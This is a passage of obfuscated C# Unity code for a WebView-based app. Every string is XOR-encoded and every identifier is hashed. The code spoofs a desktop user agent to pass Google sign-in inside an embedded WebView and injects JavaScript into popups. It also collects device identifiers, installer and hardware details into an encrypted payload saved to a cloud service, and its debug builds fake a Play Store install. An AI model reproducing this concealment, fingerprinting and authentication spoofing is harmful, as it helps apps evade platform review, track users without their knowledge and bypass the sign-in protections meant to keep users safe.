                OpenUrlExternally(_0x3031a1f9);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x3031a1f9))
            {
                _0x5bb15064(true);
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[41] { 186, 146, 146, 154, 145, 152, 221, 156, 136, 137, 149, 221, 155, 145, 146, 138, 221, 153, 152, 137, 152, 158, 137, 152, 153, 221, 208, 195, 221, 150, 152, 152, 141, 221, 139, 148, 142, 148, 159, 145, 152 }, 253));
                return;
            }

            _0xd06e0867 = true;
            _0x5bb15064(true);
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[43] { 115, 65, 70, 114, 77, 65, 83, 4, 72, 75, 69, 64, 77, 74, 67, 11, 86, 65, 64, 77, 86, 65, 71, 80, 77, 74, 67, 4, 9, 26, 4, 79, 65, 65, 84, 4, 82, 77, 87, 77, 70, 72, 65 }, 36));
        };
        _0xffde4370.OnPageCommitted += (_0x8cd0e0aa, _0x3031a1f9) =>
        {
            if (_0xd87c776b && IsAboutBlank(_0x3031a1f9))
                return;
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[31] { 241, 221, 213, 210, 156, 235, 217, 222, 234, 213, 217, 203, 156, 243, 210, 236, 221, 219, 217, 255, 211, 209, 209, 213, 200, 200, 217, 216, 134, 156, 151 }, 188) + (Time.realtimeSinceStartup - _0xadebe39e).ToString(_0x1d049fc9._0x8f92ce0a(new byte[5] { 47, 49, 47, 47, 47 }, 31)) + _0x1d049fc9._0x8f92ce0a(new byte[2] { 69, 22 }, 54) + _0x3031a1f9);
            if (!firstLoadShown && IsHttpUrl(_0x3031a1f9))
            {
                firstLoadShown = true;
                _0xd06e0867 = false;
                _0x5bb15064(false);
                _0xb113ab39();
                _0x9d544791();
                _0x8cd0e0aa.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xa70dc5de(_0x1d049fc9._0x8f92ce0a(new byte[9] { 201, 200, 225, 209, 206, 219, 208, 219, 218 }, 190));
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[39] { 166, 138, 130, 133, 203, 188, 142, 137, 189, 130, 142, 156, 203, 152, 131, 132, 156, 133, 203, 132, 133, 203, 136, 132, 134, 134, 130, 159, 159, 142, 143, 203, 136, 132, 133, 159, 142, 133, 159 }, 235));
            }
        };
        _0xffde4370.OnPageProgressChanged += (_0x8cd0e0aa, _0xe97aa0c9) =>
        {
            if (_0xd87c776b)
                return;
            if (!firstLoadShown && _0xe97aa0c9 >= 0.65f)
            {
                firstLoadShown = true;
                _0xd06e0867 = false;
                _0x5bb15064(false);
                _0xb113ab39();
                _0x9d544791();
                _0x8cd0e0aa.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xa70dc5de(_0x1d049fc9._0x8f92ce0a(new byte[9] { 33, 32, 9, 57, 38, 51, 56, 51, 50 }, 86));
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[32] { 37, 9, 1, 6, 72, 63, 13, 10, 62, 1, 13, 31, 72, 27, 0, 7, 31, 6, 72, 10, 17, 72, 24, 26, 7, 15, 26, 13, 27, 27, 82, 72 }, 104) + _0xe97aa0c9);
            }
        };
        _0xffde4370.OnPageFinished += (_0x8cd0e0aa, _0x183b867c, _0x3031a1f9) =>
        {
            if (_0xd87c776b && IsAboutBlank(_0x3031a1f9))
            {
                _0xd87c776b = false;
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[28] { 253, 223, 200, 218, 204, 223, 192, 141, 204, 207, 194, 216, 217, 151, 207, 193, 204, 195, 198, 141, 203, 196, 195, 196, 222, 197, 200, 201 }, 173));
                return;
            }

            WLog(_0x1d049fc9._0x8f92ce0a(new byte[24] { 19, 63, 55, 48, 126, 9, 59, 60, 8, 55, 59, 41, 126, 24, 55, 48, 55, 45, 54, 59, 58, 100, 126, 117 }, 94) + (Time.realtimeSinceStartup - _0xadebe39e).ToString(_0x1d049fc9._0x8f92ce0a(new byte[5] { 25, 7, 25, 25, 25 }, 41)) + _0x1d049fc9._0x8f92ce0a(new byte[7] { 40, 123, 56, 52, 63, 62, 102 }, 91) + _0x183b867c + _0x1d049fc9._0x8f92ce0a(new byte[5] { 114, 39, 32, 62, 111 }, 82) + _0x3031a1f9);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0xd06e0867 = false;
                _0x5bb15064(false);
                _0xb113ab39();
                _0x9d544791();
                _0x8cd0e0aa.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xa70dc5de(_0x1d049fc9._0x8f92ce0a(new byte[9] { 11, 10, 35, 19, 12, 25, 18, 25, 24 }, 124));
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[33] { 174, 130, 138, 141, 195, 180, 134, 129, 181, 138, 134, 148, 195, 133, 138, 145, 144, 151, 195, 143, 140, 130, 135, 195, 128, 140, 142, 147, 143, 134, 151, 134, 135 }, 227));
            }
            else if (_0xd06e0867)
            {
                _0xd06e0867 = false;
                _0x5bb15064(false);
                _0x8cd0e0aa.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[40] { 5, 41, 33, 38, 104, 31, 45, 42, 30, 33, 45, 63, 104, 27, 32, 39, 63, 104, 41, 46, 60, 45, 58, 104, 36, 39, 41, 44, 33, 38, 47, 104, 46, 33, 38, 33, 59, 32, 45, 44 }, 72));
            }
            else
            {
                _0x5bb15064(false);
            }

            if (_0xf7e4abee && !IsGoogleAuthFlowUrl(_0x3031a1f9) && !IsGoogleAuthFlowUrl(_0x3031a1f9))
            {
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[48] { 96, 72, 72, 64, 75, 66, 7, 70, 82, 83, 79, 7, 84, 66, 66, 74, 84, 7, 65, 78, 73, 78, 84, 79, 66, 67, 7, 10, 25, 7, 85, 66, 84, 83, 72, 85, 66, 7, 67, 66, 65, 70, 82, 75, 83, 7, 114, 102 }, 39));
                _0xf7e4abee = false;
                _0x9df718e6.SetUserAgent("");
            }
        };
        _0xffde4370.OnShouldClose += _0x8cd0e0aa =>
        {
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[41] { 70, 73, 120, 110, 105, 64, 61, 80, 124, 116, 115, 61, 74, 120, 127, 75, 116, 120, 106, 61, 82, 115, 78, 117, 114, 104, 113, 121, 94, 113, 114, 110, 120, 61, 116, 115, 107, 114, 118, 120, 121 }, 29));
            _0xd4d51f05();
            return false;
        };
        _0xffde4370.SetPopupPageEventEnabled(true);
        bool _0xed6c6f4b = false;
        bool _0x2452b755 = false;
        _0xffde4370.OnMultipleWindowOpened += (_0x8cd0e0aa, _0xfa11efc6) =>
        {
            _0x8cd0e0aa.ScrollTo(0, 0, false);
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[43] { 18, 29, 44, 58, 61, 20, 105, 4, 40, 32, 39, 105, 30, 44, 43, 31, 32, 44, 62, 105, 4, 60, 37, 61, 32, 57, 37, 44, 30, 32, 39, 45, 38, 62, 105, 6, 57, 44, 39, 44, 45, 115, 105 }, 73) + _0xfa11efc6);
            var _0xd49d7c50 = _0xffde4370.GetPopupWindow(_0xfa11efc6);
            if (_0xd49d7c50 == null)
                return;
            _0xe8116563.Add(_0xd49d7c50);
            Debug.Log($"[Test] Popup ID: {_0xd49d7c50.Id}");
            _0xd49d7c50.OnPageStarted += (_0x91d8a06d, _0x3031a1f9) =>
            {
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[36] { 226, 237, 220, 202, 205, 228, 153, 233, 214, 201, 204, 201, 153, 238, 220, 219, 239, 208, 220, 206, 153, 246, 215, 233, 216, 222, 220, 234, 205, 216, 203, 205, 220, 221, 131, 153 }, 185) + _0x3031a1f9);
                _0x2263a0bc = 0;
                if (string.IsNullOrEmpty(_0x3031a1f9) || IsAboutBlank(_0x3031a1f9))
                    return;
                if (IsGoogleAuthFlowUrl(_0x3031a1f9))
                {
                    WLog(_0x1d049fc9._0x8f92ce0a(new byte[57] { 192, 207, 254, 232, 239, 198, 187, 203, 244, 235, 238, 235, 187, 220, 244, 244, 252, 247, 254, 187, 250, 238, 239, 243, 187, 253, 247, 244, 236, 187, 182, 165, 187, 232, 235, 244, 244, 253, 187, 220, 244, 244, 252, 247, 254, 187, 216, 243, 233, 244, 246, 254, 187, 206, 218, 161, 187 }, 155) + _0x3031a1f9);
                    _0xed6c6f4b = false;
                    _0xb08301c2();
                    if (_0x91d8a06d != null && _0x91d8a06d.IsAlive)
                        _0x91d8a06d.EvaluateJavaScript(_0x00c3e72e());
                    return;
                }

                if (_0x9df718e6 == null)
                    return;
                if (!_0xed6c6f4b)
                {
                    _0xed6c6f4b = true;
                    _0x9df718e6.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x1d049fc9._0x8f92ce0a(new byte[39] { 92, 83, 98, 116, 115, 90, 39, 87, 104, 119, 114, 119, 39, 102, 119, 119, 107, 126, 39, 80, 110, 105, 99, 104, 112, 116, 39, 99, 98, 116, 108, 115, 104, 119, 39, 82, 70, 61, 39 }, 7) + _0x3031a1f9);
                }

                if (_0x91d8a06d != null && _0x91d8a06d.IsAlive)
                    _0x91d8a06d.EvaluateJavaScript(_0x1fd1decb());
                if (!_0x2452b755 && _0x91d8a06d != null && _0x91d8a06d.IsAlive && IsHttpUrl(_0x3031a1f9))
                {
                    _0x2452b755 = true;
                }
            };
            _0xd49d7c50.OnPageFinished += (_0x91d8a06d, _0xd44ee5e5) =>
            {
                string _0x619f5770 = _0xd44ee5e5 != null ? _0xd44ee5e5.data : string.Empty;
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[35] { 234, 229, 212, 194, 197, 236, 145, 225, 222, 193, 196, 193, 145, 230, 212, 211, 231, 216, 212, 198, 145, 247, 216, 223, 216, 194, 217, 212, 213, 139, 145, 196, 195, 221, 140 }, 177) + _0x619f5770);
                if (_0x91d8a06d == null || !_0x91d8a06d.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x619f5770))
                {
                    _0xb08301c2();
                    _0x91d8a06d.EvaluateJavaScript(_0x00c3e72e());
                    return;
                }

                if (!_0xed6c6f4b)
                    return;
                _0x91d8a06d.EvaluateJavaScript(_0x1fd1decb());
            };
        };
        _0xffde4370.OnMultipleWindowClosed += (_0x8cd0e0aa, _0xfa11efc6) =>
        {
            _0xe8116563.RemoveAll(_0x7e0e551e => _0x7e0e551e == null || _0x7e0e551e.Id == _0xfa11efc6 || !_0x7e0e551e.IsAlive);
            _0x5bb15064(false);
            if (_0xe8116563.Count == 0 && _0x9df718e6 != null)
            {
                _0xed6c6f4b = false;
                _0x2452b755 = false;
                _0x265c57c5();
            }

            WLog(_0x1d049fc9._0x8f92ce0a(new byte[43] { 174, 161, 144, 134, 129, 168, 213, 184, 148, 156, 155, 213, 162, 144, 151, 163, 156, 144, 130, 213, 184, 128, 153, 129, 156, 133, 153, 144, 162, 156, 155, 145, 154, 130, 213, 182, 153, 154, 134, 144, 145, 207, 213 }, 245) + _0xfa11efc6);
        };
        _0xffde4370.RegisterOnRequestMediaCapturePermission(_0x6b0a7028 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private bool _0x3a955caa = false;
    internal bool IsHttpUrl(string _0xa8bbe090)
    {
        if (string.IsNullOrEmpty(_0xa8bbe090))
            return false;
        return _0xa8bbe090.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[7] { 37, 57, 57, 61, 119, 98, 98 }, 77), StringComparison.OrdinalIgnoreCase) || _0xa8bbe090.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[8] { 119, 107, 107, 111, 108, 37, 48, 48 }, 31), StringComparison.OrdinalIgnoreCase);
    }

    private Task _0x69223831(IEnumerator _0xf882af98)
    {
        var _0xe0bbba5e = new TaskCompletionSource<bool>();
        StartCoroutine(_0xd8692717(_0xf882af98, _0xe0bbba5e));
        return _0xe0bbba5e.Task;
    }

    private bool _0xf4cbdc51(string _0x236608ac)
    {
        if (string.IsNullOrEmpty(_0x236608ac))
            return false;
        try
        {
            using (var _0x3839eec3 = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[30] { 189, 177, 179, 240, 171, 176, 183, 170, 167, 237, 186, 240, 174, 178, 191, 167, 187, 172, 240, 139, 176, 183, 170, 167, 142, 178, 191, 167, 187, 172 }, 222)))
            using (var _0xe46c90c1 = _0x3839eec3.GetStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[15] { 163, 181, 178, 178, 165, 174, 180, 129, 163, 180, 169, 182, 169, 180, 185 }, 192)))
            using (var _0xccf8858b = _0xe46c90c1.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[17] { 18, 16, 1, 37, 20, 22, 30, 20, 18, 16, 56, 20, 27, 20, 18, 16, 7 }, 117)))
            using (var _0xb60a1dfe = _0xccf8858b.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[25] { 64, 66, 83, 107, 70, 82, 73, 68, 79, 110, 73, 83, 66, 73, 83, 97, 72, 85, 119, 70, 68, 76, 70, 64, 66 }, 39), _0x236608ac))
            {
                if (_0xb60a1dfe == null)
                    return false;
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[37] { 252, 215, 205, 208, 210, 218, 243, 214, 212, 218, 159, 211, 222, 202, 209, 220, 215, 159, 214, 209, 204, 203, 222, 211, 211, 218, 219, 159, 207, 222, 220, 212, 222, 216, 218, 133, 159 }, 191) + _0x236608ac);
                _0xb60a1dfe.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[8] { 211, 214, 214, 244, 222, 211, 213, 193 }, 178), 0x10000000);
                _0xe46c90c1.Call(_0x1d049fc9._0x8f92ce0a(new byte[13] { 111, 104, 125, 110, 104, 93, 127, 104, 117, 106, 117, 104, 101 }, 28), _0xb60a1dfe);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private Canvas _0x25023b40;
    private void _0xdb056523(string _0x9a903a3b)
    {
        bool _0xa2a35459 = !string.IsNullOrEmpty(_0x9a903a3b);
        if (_0xa2a35459)
        {
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[13] { 131, 140, 189, 171, 172, 133, 248, 139, 176, 183, 175, 226, 248 }, 216) + _0x9a903a3b);
#endif
            }

            _0x20c1feff(_0x9a903a3b);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[39] { 221, 210, 227, 245, 242, 219, 166, 192, 231, 234, 234, 228, 231, 229, 237, 166, 100, 0, 20, 166, 193, 231, 235, 227, 166, 174, 232, 233, 166, 224, 239, 232, 231, 234, 166, 211, 212, 202, 175 }, 134));
#endif
            }

            _0x0d6382ad();
            return;
        }
    }

    private IEnumerator _0xa2e66781()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private bool _0xf7e4abee = false;
    private async Task _0xe3605a82()
    {
        if (await _0xa39d237f())
            return;
        if (await _0x5376617c())
            return;
        if (await _0x74c2f02e())
            return;
        _0xd354975c();
        await _0x69223831(_0x0b24764e());
        _0x59b39712 = await _0xb140274b();
        await _0xf35714f0();
    }

    internal void _0x9d544791()
    {
        Rect _0x5b9c53ec = Screen.safeArea;
        Vector2 _0x6f63eaac = new Vector2(Screen.width, Screen.height);
        if (_0x5b9c53ec == lastSafe && _0x6f63eaac == lastSize)
            return;
        _0x5b9c53ec.xMin += _0xb7874c60;
        _0x5b9c53ec.xMax -= _0x5a3f5416;
        _0x5b9c53ec.yMin += _0x9744bd56;
        _0x5b9c53ec.yMax -= _0xf83b9c5c;
        // Convert Unity safe area -> native WebView frame
        Rect _0x45c0f6ed = new Rect(_0x5b9c53ec.x, _0x6f63eaac.y - _0x5b9c53ec.y - _0x5b9c53ec.height, // Y flip for native coordinate system
 _0x5b9c53ec.width, _0x5b9c53ec.height);
        _0x9df718e6.Frame = _0x45c0f6ed;
        lastSafe = Screen.safeArea;
        lastSize = _0x6f63eaac;
    }

    private string _0x90d5e8fd;
    private bool _0xcfb752c7(string _0x8d0838ec, string _0xbdb53a6e)
    {
        string _0xd6d84db5 = _0x1d744a58(_0x8d0838ec);
        if (string.IsNullOrEmpty(_0xd6d84db5))
            _0xd6d84db5 = _0xbdb53a6e;
        if (_0xf4cbdc51(_0xd6d84db5))
            return true;
        string _0xb186a3b8 = string.IsNullOrEmpty(_0xd6d84db5) ? _0x1d049fc9._0x8f92ce0a(new byte[29] { 92, 64, 64, 68, 71, 14, 27, 27, 68, 88, 85, 77, 26, 83, 91, 91, 83, 88, 81, 26, 87, 91, 89, 27, 71, 64, 91, 70, 81 }, 52) : _0x1d049fc9._0x8f92ce0a(new byte[46] { 134, 154, 154, 158, 157, 212, 193, 193, 158, 130, 143, 151, 192, 137, 129, 129, 137, 130, 139, 192, 141, 129, 131, 193, 157, 154, 129, 156, 139, 193, 143, 158, 158, 157, 193, 138, 139, 154, 143, 135, 130, 157, 209, 135, 138, 211 }, 238) + _0xd6d84db5;
        WLog(_0x1d049fc9._0x8f92ce0a(new byte[35] { 82, 121, 99, 126, 124, 116, 93, 120, 122, 116, 49, 124, 112, 99, 122, 116, 101, 49, 119, 112, 125, 125, 115, 112, 114, 122, 49, 112, 98, 49, 102, 116, 115, 43, 49 }, 17) + _0xb186a3b8);
        return _0x16ec9c4c(_0xb186a3b8);
    }

    private void WLog(string _0xecefe013)
    {
#if B_LOGS
        {
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[7] { 1, 14, 63, 41, 46, 7, 122 }, 90) + _0xecefe013);
        }
#endif
    }

    private IEnumerator _0xd8692717(IEnumerator _0xa02ce9b2, TaskCompletionSource<bool> _0xd0c92362)
    {
        yield return _0xa02ce9b2;
        _0xd0c92362.SetResult(true);
    }

    internal bool isApplicationPause = false;
    // WS_SOURCE MONO
    public static _0x6de4ac9a _0xd55456c5 { get; private set; }

    private string _0x55c32e94 = "";
    private Canvas _0x3babe529()
    {
        if (_0x25023b40 != null)
            return _0x25023b40;
        var _0xe2a952b8 = gameObject.GetComponentInChildren<Canvas>();
        if (_0xe2a952b8 == null)
        {
            var _0x84c66da4 = new GameObject(_0x1d049fc9._0x8f92ce0a(new byte[6] { 127, 93, 82, 74, 93, 79 }, 60), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0xe2a952b8 = _0x84c66da4.GetComponent<Canvas>();
            _0xe2a952b8.transform.SetParent(transform, false);
            _0xe2a952b8.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x25023b40 = _0xe2a952b8;
        return _0x25023b40;
    }

    private async Task _0xa70dc5de(string _0xdef0f9cc)
    {
        if (_0xc911ee41 || string.IsNullOrEmpty(_0x1e834b18) || string.IsNullOrEmpty(_0xdef0f9cc) || _0x81cb4b17)
            return;
        _0xc911ee41 = true;
        try
        {
            JObject _0x2a2e0a78 = BuildRandomPayload(_0xdef0f9cc, _0x1e834b18, _0x1240df56());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xdef0f9cc} payload: {_0x2a2e0a78}");
                }
#endif
            }

            var _0xc0b0a96b = _0x92c538ef(_0x2a2e0a78.ToString(), _0x1e834b18);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x1d049fc9._0x8f92ce0a(new byte[4] { 7, 4, 10, 15 }, 107) + _0x1e834b18, _0xc0b0a96b } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[24] { 181, 186, 171, 189, 186, 179, 206, 162, 129, 143, 138, 206, 158, 143, 157, 157, 206, 139, 156, 156, 129, 156, 212, 206 }, 238) + e.Message);
#endif
            }
        }
    }

    private static bool IsPrivacyItemTrue(Item _0x70dd8288)
    {
        if (_0x70dd8288.Key != _0x1d049fc9._0x8f92ce0a(new byte[9] { 53, 47, 12, 46, 53, 42, 61, 63, 37 }, 92))
            return false;
        try
        {
            var _0x97443315 = _0x70dd8288.Value.GetAs<object>();
            return _0x97443315 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private int _0xccb4b998 = -1;
    private bool _0x481a3029()
    {
        var _0xe3a2e192 = Keyboard.current;
        return _0xe3a2e192 != null && _0xe3a2e192.escapeKey.wasPressedThisFrame;
    }

    private bool _0x10d43755 = false;
    internal bool firstLoadShown = false;
    private string _0xaefb46b5 { get; set; }

    private async void Start()
    {
        await _0xe3605a82();
    }

    private void _0xd354975c()
    {
        {
#if B_LOGS
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[22] { 20, 27, 42, 60, 59, 18, 111, 28, 59, 32, 61, 42, 11, 42, 57, 38, 44, 42, 6, 33, 41, 32 }, 79));
#endif
        }

        _0xb8208a43 = SystemInfo.deviceModel;
        _0x23fbf75f = Application.version;
        _0xd16f0d8d = Application.installMode;
        _0xaa26f6d0 = Application.installerName;
        _0x8a84d556 = Application.identifier;
        _0xb0db1dbc = _0x710b64d4();
        _0xf17f22c0 = _0xda1d4974();
        _0x3eff9c2d = SystemInfo.deviceUniqueIdentifier;
        _0x826a2fc7 = SystemInfo.graphicsDeviceName;
        _0xeb644c4c = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x23fbf75f = _0x1d049fc9._0x8f92ce0a(new byte[5] { 153, 128, 153, 128, 153 }, 174);
                _0xd16f0d8d = ApplicationInstallMode.Store;
                _0xaa26f6d0 = _0x1d049fc9._0x8f92ce0a(new byte[19] { 104, 100, 102, 37, 106, 101, 111, 121, 100, 98, 111, 37, 125, 110, 101, 111, 98, 101, 108 }, 11);
                _0xf17f22c0 = _0x1d049fc9._0x8f92ce0a(new byte[8] { 238, 230, 251, 255, 242, 171, 254, 234 }, 139);
                _0x3eff9c2d = Guid.NewGuid().ToString().Replace(_0x1d049fc9._0x8f92ce0a(new byte[1] { 172 }, 129), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[17] { 43, 36, 21, 3, 4, 45, 80, 20, 21, 6, 61, 31, 20, 21, 28, 74, 80 }, 112) + _0xb8208a43);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[19] { 178, 189, 140, 154, 157, 180, 201, 136, 153, 153, 191, 140, 155, 154, 128, 134, 135, 211, 201 }, 233) + _0x23fbf75f);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[20] { 57, 54, 7, 17, 22, 63, 66, 11, 12, 17, 22, 3, 14, 14, 47, 13, 6, 7, 88, 66 }, 98) + _0xd16f0d8d);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[23] { 124, 115, 66, 84, 83, 122, 7, 78, 73, 84, 83, 70, 75, 75, 66, 85, 116, 83, 72, 85, 66, 29, 7 }, 39) + _0xaa26f6d0);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[14] { 240, 255, 206, 216, 223, 246, 139, 202, 219, 219, 226, 207, 145, 139 }, 171) + _0x8a84d556);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[14] { 244, 251, 202, 220, 219, 242, 143, 206, 203, 217, 230, 203, 149, 143 }, 175) + _0xb0db1dbc);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[18] { 57, 54, 7, 17, 22, 63, 66, 23, 17, 7, 16, 35, 5, 7, 12, 22, 88, 66 }, 98) + _0xf17f22c0);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[17] { 69, 74, 123, 109, 106, 67, 62, 109, 103, 109, 90, 123, 104, 87, 122, 36, 62 }, 30) + _0x3eff9c2d);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[12] { 87, 88, 105, 127, 120, 81, 44, 107, 124, 121, 54, 44 }, 12) + _0x826a2fc7);
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[12] { 114, 125, 76, 90, 93, 116, 9, 74, 89, 92, 19, 9 }, 41) + _0xeb644c4c);
#endif
        }
    }

    private string _0x8a84d556 = "";
    private string _0x828f4b6d = "";
    private string _0x550ba06c = "";
    private bool _0x45d6b6f4(string _0x90aa1cb6)
    {
        try
        {
            using (var _0x5d2ae7e6 = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[30] { 139, 135, 133, 198, 157, 134, 129, 156, 145, 219, 140, 198, 152, 132, 137, 145, 141, 154, 198, 189, 134, 129, 156, 145, 184, 132, 137, 145, 141, 154 }, 232)))
            using (var _0xea0434af = _0x5d2ae7e6.GetStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[15] { 252, 234, 237, 237, 250, 241, 235, 222, 252, 235, 246, 233, 246, 235, 230 }, 159)))
            using (var _0xd2b3ebbc = _0xea0434af.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[17] { 105, 107, 122, 94, 111, 109, 101, 111, 105, 107, 67, 111, 96, 111, 105, 107, 124 }, 14)))
            using (var _0x8fb540cc = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[22] { 245, 250, 240, 230, 251, 253, 240, 186, 247, 251, 250, 224, 241, 250, 224, 186, 221, 250, 224, 241, 250, 224 }, 148)))
            using (var _0xe4bbcb17 = _0x8fb540cc.CallStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[8] { 129, 144, 131, 130, 148, 164, 131, 152 }, 241), _0x90aa1cb6, 1))
            {
                string _0x122af5bd = _0xe4bbcb17.Call<string>(_0x1d049fc9._0x8f92ce0a(new byte[14] { 224, 226, 243, 212, 243, 245, 238, 233, 224, 194, 255, 243, 245, 230 }, 135), _0x1d049fc9._0x8f92ce0a(new byte[20] { 252, 236, 241, 233, 237, 251, 236, 193, 248, 255, 242, 242, 252, 255, 253, 245, 193, 235, 236, 242 }, 158));
                string _0x0568a233 = _0xe4bbcb17.Call<string>(_0x1d049fc9._0x8f92ce0a(new byte[10] { 18, 16, 1, 37, 20, 22, 30, 20, 18, 16 }, 117));
                _0xe4bbcb17.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[11] { 33, 36, 36, 3, 33, 52, 37, 39, 47, 50, 57 }, 64), _0x1d049fc9._0x8f92ce0a(new byte[33] { 25, 22, 28, 10, 23, 17, 28, 86, 17, 22, 12, 29, 22, 12, 86, 27, 25, 12, 29, 31, 23, 10, 1, 86, 58, 42, 55, 47, 43, 57, 58, 52, 61 }, 120));
                _0xe4bbcb17.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[11] { 134, 145, 153, 155, 130, 145, 177, 140, 128, 134, 149 }, 244), _0x1d049fc9._0x8f92ce0a(new byte[20] { 205, 221, 192, 216, 220, 202, 221, 240, 201, 206, 195, 195, 205, 206, 204, 196, 240, 218, 221, 195 }, 175));
                if (_0xe4bbcb17.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[15] { 42, 61, 43, 55, 52, 46, 61, 25, 59, 44, 49, 46, 49, 44, 33 }, 88), _0xd2b3ebbc) != null)
                {
                    WLog(_0x1d049fc9._0x8f92ce0a(new byte[24] { 85, 126, 100, 121, 123, 115, 90, 127, 125, 115, 54, 121, 102, 115, 120, 54, 127, 120, 98, 115, 120, 98, 44, 54 }, 22) + _0x90aa1cb6);
                    _0xe4bbcb17.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[8] { 163, 166, 166, 132, 174, 163, 165, 177 }, 194), 0x10000000);
                    _0xea0434af.Call(_0x1d049fc9._0x8f92ce0a(new byte[13] { 126, 121, 108, 127, 121, 76, 110, 121, 100, 123, 100, 121, 116 }, 13), _0xe4bbcb17);
                    return true;
                }

                if (_0xf4cbdc51(_0x0568a233))
                    return true;
                if (!string.IsNullOrEmpty(_0x122af5bd))
                {
                    WLog(_0x1d049fc9._0x8f92ce0a(new byte[28] { 13, 38, 60, 33, 35, 43, 2, 39, 37, 43, 110, 39, 32, 58, 43, 32, 58, 110, 40, 47, 34, 34, 44, 47, 45, 37, 116, 110 }, 78) + _0x122af5bd);
                    if (_0x148f04e9(_0x122af5bd))
                        return _0xcfb752c7(_0x122af5bd, _0x0568a233);
                    return _0x16ec9c4c(_0x122af5bd);
                }

                WLog(_0x1d049fc9._0x8f92ce0a(new byte[30] { 232, 195, 217, 196, 198, 206, 231, 194, 192, 206, 139, 194, 197, 223, 206, 197, 223, 139, 197, 196, 139, 195, 202, 197, 207, 199, 206, 217, 145, 139 }, 171) + _0x90aa1cb6);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[26] { 234, 193, 219, 198, 196, 204, 229, 192, 194, 204, 137, 192, 199, 221, 204, 199, 221, 137, 207, 200, 192, 197, 204, 205, 147, 137 }, 169) + e.Message);
            return true;
        }
    }

    private string _0x31a7d859 = "";
    private string _0x826a2fc7 = "";
    private JObject BuildRandomPayload(params string[] _0xe17888ea)
    {
        JObject _0x3952dc59 = new JObject();
        foreach (var _0x0bcfc5ea in _0xe17888ea)
        {
            string _0xb2e8004c = _0x0842a580();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0xb2e8004c} val={_0x0bcfc5ea}");
#endif
            }

            _0x3952dc59.Add(_0xb2e8004c, _0x0bcfc5ea == null ? "" : _0x0bcfc5ea);
        }

        return _0x3952dc59;
    }

    private async Task<string> _0x1c49d211(int _0xa3d9a80f = 5, int _0xe4e07533 = 500)
    {
        try
        {
            List<EntityData> _0xb407cd54 = new List<EntityData>();
